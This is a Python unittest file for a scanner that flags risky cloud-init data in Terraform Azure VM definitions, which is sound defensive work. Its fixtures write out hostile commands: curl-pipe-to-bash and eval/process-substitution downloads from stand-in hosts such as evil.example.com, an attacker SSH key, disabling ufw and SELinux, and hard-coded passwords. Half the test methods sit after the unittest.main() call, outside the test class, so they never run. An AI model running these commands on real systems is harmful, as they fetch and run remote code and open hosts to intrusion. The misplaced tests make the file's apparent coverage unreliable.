#!/usr/bin/env python3
from __future__ import annotations

import importlib.util
import tempfile
import unittest
from pathlib import Path


def _load_scanner_module(repo_root: Path):
    module_path = repo_root / "shift-left" / "cloudinit-scanner" / "cloudinit_scan.py"
    spec = importlib.util.spec_from_file_location("cloudinit_scan", module_path)
    module = importlib.util.module_from_spec(spec)
    assert spec and spec.loader
    spec.loader.exec_module(module)
    return module


class TestCloudInitScanner(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.repo_root = Path(__file__).resolve().parents[3]
        cls.scanner = _load_scanner_module(cls.repo_root)

    def _scan(self, tf_body: str, default_env: str = "prod"):
        with tempfile.TemporaryDirectory(prefix="cloudinit-scan-test-") as tmpdir:
            tf_dir = Path(tmpdir) / "terraform"
            tf_dir.mkdir(parents=True, exist_ok=True)
            (tf_dir / "main.tf").write_text(tf_body, encoding="utf-8")
            report = self.scanner.analyze_terraform(
                terraform_dir=tf_dir,
                repo_root=tf_dir,
                default_env=default_env,
            )
        self.assertEqual(len(report["resources_analyzed"]), 1)
        return report, report["resources_analyzed"][0]

    def test_legitimate_vm_nginx(self):
        report, resource = self._scan(
            """
resource "azurerm_linux_virtual_machine" "web" {
  name                = "vm-web"
  resource_group_name = "rg"
  location            = "westeurope"
  size                = "Standard_B1s"
  network_interface_ids = []
  admin_username      = "cloudadmin"

  tags = {
    "cs:role"    = "web-server"
    "Environment" = "prod"
  }

  custom_data = <<-EOT
#cloud-config
packages:
  - nginx
runcmd:
  - systemctl enable nginx
EOT
}
            """,
        )
        self.assertEqual(report["summary"]["total_violations"], 0)
        self.assertEqual(resource["signals"]["role_spoofing_candidate"], False)
        self.assertEqual(resource["signals"]["remote_exec_detected"], False)

    def test_role_spoofing_web_server_with_postgresql(self):
        report, resource = self._scan(
            """
resource "azurerm_linux_virtual_machine" "web" {
  name                = "vm-web"
  resource_group_name = "rg"
  location            = "westeurope"
  size                = "Standard_B1s"
  network_interface_ids = []
  admin_username      = "cloudadmin"

  tags = {
    "cs:role"    = "web-server"
    "Environment" = "prod"
  }

  custom_data = <<-EOT
#cloud-config
packages:
  - nginx
  - postgresql
EOT
}
            """,
        )
        self.assertEqual(report["summary"]["blocking_violations"], 1)
        rules = {v["rule"] for v in resource["violations"]}
        self.assertIn("CS-MULTI-SIGNAL-ROLE-SPOOFING-V2", rules)

    def test_remote_exec_curl_pipe_bash(self):
        report, resource = self._scan(
            """
resource "azurerm_linux_virtual_machine" "web" {
  name                = "vm-web"
  resource_group_name = "rg"
  location            = "westeurope"
  size                = "Standard_B1s"
  network_interface_ids = []
  admin_username      = "cloudadmin"

  tags = {
    "cs:role"    = "worker"
    "Environment" = "prod"
  }

  custom_data = <<-EOT
#cloud-config
runcmd:
  - curl -fsSL https://malicious.example/install.sh | bash
EOT
}
            """,
        )
        self.assertGreaterEqual(report["summary"]["total_violations"], 1)
        rules = {v["rule"] for v in resource["violations"]}
        self.assertIn("CS-CLOUDINIT-REMOTE-EXEC", rules)

    def test_vm_without_cs_role_tag(self):
        report, resource = self._scan(
            """
resource "azurerm_linux_virtual_machine" "web" {
  name                = "vm-web"
  resource_group_name = "rg"
  location            = "westeurope"
  size                = "Standard_B1s"
  network_interface_ids = []
  admin_username      = "cloudadmin"

  tags = {
    "Environment" = "prod"
  }

  custom_data = <<-EOT
#cloud-config
packages:
  - nginx
EOT
}
            """,
        )
        self.assertEqual(resource["role_tag"], None)
        rules = {v["rule"] for v in resource["violations"]}
        self.assertIn("CS-CLOUDINIT-ROLE-TAG-MISSING", rules)
        self.assertEqual(report["summary"]["blocking_violations"], 1)

    def test_dev_environment_is_not_blocking(self):
        report, resource = self._scan(
            """
resource "azurerm_linux_virtual_machine" "web" {
  name                = "vm-web"
  resource_group_name = "rg"
  location            = "westeurope"
  size                = "Standard_B1s"
  network_interface_ids = []
  admin_username      = "cloudadmin"

  tags = {
    "cs:role"    = "web-server"
    "Environment" = "dev"
  }

  custom_data = <<-EOT
#cloud-config
packages:
  - postgresql
EOT
}
            """,
        )
        self.assertGreaterEqual(report["summary"]["total_violations"], 1)
        self.assertEqual(report["summary"]["blocking_violations"], 0)
        self.assertTrue(all(v.get("block") is False for v in resource["violations"]))


if __name__ == "__main__":
    unittest.main()

    # ─────────────────────────────────────────────────────────────────
    # Extended remote exec patterns (audit correction R2)
    # ─────────────────────────────────────────────────────────────────

    def test_eval_curl_detected(self):
        """eval $(curl ...) is a common obfuscation technique — must be caught."""
        report, resource = self._scan(
            """
resource "azurerm_linux_virtual_machine" "app" {
  name                = "vm-app"
  resource_group_name = "rg"
  location            = "westeurope"
  size                = "Standard_B1s"
  network_interface_ids = []
  admin_username      = "cloudadmin"

  tags = {
    "cs:role"    = "app-server"
    "Environment" = "prod"
  }

  custom_data = <<-EOT
#cloud-config
runcmd:
  - eval "$(curl -s https://evil.example.com/init.sh)"
EOT
}
            """,
        )
        rules = {v["rule"] for v in resource["violations"]}
        self.assertIn("CS-CLOUDINIT-REMOTE-EXEC", rules)
        patterns = resource["signals"]["remote_exec_patterns"]
        self.assertIn("eval_remote_exec", patterns)

    def test_process_substitution_detected(self):
        """bash <(curl ...) is a process substitution remote exec — must be caught."""
        report, resource = self._scan(
            """
resource "azurerm_linux_virtual_machine" "app" {
  name                = "vm-app"
  resource_group_name = "rg"
  location            = "westeurope"
  size                = "Standard_B1s"
  network_interface_ids = []
  admin_username      = "cloudadmin"

  tags = {
    "cs:role"    = "worker"
    "Environment" = "prod"
  }

  custom_data = <<-EOT
#cloud-config
runcmd:
  - bash <(curl -s https://evil.example.com/setup.sh)
EOT
}
            """,
        )
        rules = {v["rule"] for v in resource["violations"]}
        self.assertIn("CS-CLOUDINIT-REMOTE-EXEC", rules)
        self.assertIn("process_substitution_remote", resource["signals"]["remote_exec_patterns"])

    def test_curl_sudo_bash_detected(self):
        """curl | sudo bash variant must be caught."""
        report, resource = self._scan(
            """
resource "azurerm_linux_virtual_machine" "app" {
  name                = "vm-app"
  resource_group_name = "rg"
  location            = "westeurope"
  size                = "Standard_B1s"
  network_interface_ids = []
  admin_username      = "cloudadmin"

  tags = {
    "cs:role"    = "worker"
    "Environment" = "prod"
  }

  custom_data = <<-EOT
#cloud-config
runcmd:
  - curl -fsSL https://evil.example.com/install.sh | sudo bash
EOT
}
            """,
        )
        rules = {v["rule"] for v in resource["violations"]}
        self.assertIn("CS-CLOUDINIT-REMOTE-EXEC", rules)

    # ─────────────────────────────────────────────────────────────────
    # Security bypass patterns (audit correction R3)
    # ─────────────────────────────────────────────────────────────────

    def test_ssh_key_injection_detected(self):
        """ssh_authorized_keys stanza in cloud-config must be flagged."""
        report, resource = self._scan(
            """
resource "azurerm_linux_virtual_machine" "bastion" {
  name                = "vm-bastion"
  resource_group_name = "rg"
  location            = "westeurope"
  size                = "Standard_B1s"
  network_interface_ids = []
  admin_username      = "cloudadmin"

  tags = {
    "cs:role"    = "bastion"
    "Environment" = "prod"
  }

  custom_data = <<-EOT
#cloud-config
ssh_authorized_keys:
  - ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB attacker@evil.com
EOT
}
            """,
        )
        rules = {v["rule"] for v in resource["violations"]}
        self.assertIn("CS-CLOUDINIT-SSH-KEY-INJECTION", rules)
        self.assertIn("ssh_key_injection", resource["signals"]["security_bypass_patterns"])
        self.assertTrue(resource["signals"]["security_bypass_detected"])

    def test_firewall_disable_detected(self):
        """setenforce 0 (SELinux disable) must be flagged as firewall bypass."""
        report, resource = self._scan(
            """
resource "azurerm_linux_virtual_machine" "app" {
  name                = "vm-app"
  resource_group_name = "rg"
  location            = "westeurope"
  size                = "Standard_B1s"
  network_interface_ids = []
  admin_username      = "cloudadmin"

  tags = {
    "cs:role"    = "app-server"
    "Environment" = "prod"
  }

  custom_data = <<-EOT
#cloud-config
runcmd:
  - systemctl stop ufw
  - setenforce 0
EOT
}
            """,
        )
        rules = {v["rule"] for v in resource["violations"]}
        self.assertIn("CS-CLOUDINIT-FIREWALL-DISABLE", rules)
        self.assertIn("firewall_disable", resource["signals"]["security_bypass_patterns"])

    def test_hardcoded_credentials_detected(self):
        """PASSWORD= assignment in runcmd must be flagged."""
        report, resource = self._scan(
            """
resource "azurerm_linux_virtual_machine" "db" {
  name                = "vm-db"
  resource_group_name = "rg"
  location            = "westeurope"
  size                = "Standard_B1s"
  network_interface_ids = []
  admin_username      = "cloudadmin"

  tags = {
    "cs:role"    = "db-server"
    "Environment" = "prod"
  }

  custom_data = <<-EOT
#cloud-config
runcmd:
  - export DB_PASSWORD=MySuperSecretPassword123
  - mysql -u root -pMySuperSecretPassword123 -e "CREATE DATABASE app;"
EOT
}
            """,
        )
        rules = {v["rule"] for v in resource["violations"]}
        self.assertIn("CS-CLOUDINIT-HARDCODED-CREDENTIALS", rules)
        self.assertIn("hardcoded_credentials", resource["signals"]["security_bypass_patterns"])

    def test_staging_env_remote_exec_is_blocking(self):
        """staging environment must produce blocking violations for remote exec."""
        report, resource = self._scan(
            """
resource "azurerm_linux_virtual_machine" "worker" {
  name                = "vm-worker"
  resource_group_name = "rg"
  location            = "westeurope"
  size                = "Standard_B1s"
  network_interface_ids = []
  admin_username      = "cloudadmin"

  tags = {
    "cs:role"    = "worker"
    "Environment" = "staging"
  }

  custom_data = <<-EOT
#cloud-config
runcmd:
  - curl -fsSL https://evil.example.com/agent.sh | bash
EOT
}
            """,
            default_env="staging",
        )
        rules = {v["rule"] for v in resource["violations"]}
        self.assertIn("CS-CLOUDINIT-REMOTE-EXEC", rules)
        # staging is blocking (not dev)
        blocking = [v for v in resource["violations"] if v.get("block")]
        self.assertGreater(len(blocking), 0)

    def test_clean_vm_no_violations(self):
        """A VM with correct tag, safe packages, and no bypass patterns must pass cleanly."""
        report, resource = self._scan(
            """
resource "azurerm_linux_virtual_machine" "web" {
  name                = "vm-web"
  resource_group_name = "rg"
  location            = "westeurope"
  size                = "Standard_B1s"
  network_interface_ids = []
  admin_username      = "cloudadmin"

  tags = {
    "cs:role"    = "web-server"
    "Environment" = "prod"
  }

  custom_data = <<-EOT
#cloud-config
packages:
  - nginx
  - curl
runcmd:
  - systemctl enable nginx
  - systemctl start nginx
EOT
}
            """,
        )
        self.assertEqual(len(resource["violations"]), 0)
        self.assertEqual(resource["signals"]["security_bypass_detected"], False)
        self.assertEqual(resource["signals"]["remote_exec_detected"], False)
